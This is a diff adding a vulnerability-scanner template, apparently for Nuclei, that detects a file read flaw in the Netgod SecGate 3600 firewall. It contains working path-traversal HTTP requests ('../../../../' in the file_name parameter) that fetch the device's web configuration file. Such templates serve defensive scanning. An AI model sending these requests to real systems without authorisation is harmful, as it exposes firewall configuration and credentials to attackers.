@@ -1,0 +1,32 @@
+id: netgod-secgate-3600-file-read
+info:
+  name: Netgod SecGate 3600 File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Netgod SecGate 3600 firewall is vulnerable to a file read vulnerability, which allows attackers to obtain sensitive information from the server.
+  reference:
+    - https://www.legendsec.com/newsec.php?up=2&cid=63
+variables:
+  filename: "/secgate/webui/config.inc"
+http:
+  - raw:
+      - |
+        GET /?g=sys_export_conf_local_save&file_name=../../../../secgate/webui/modules/system/import_export.mds HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sys_export_conf_local_save"
+  - raw:
+      - |
+        GET /?g=sys_export_conf_local_save&file_name=../../../../{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "sys_export_conf_local_save"
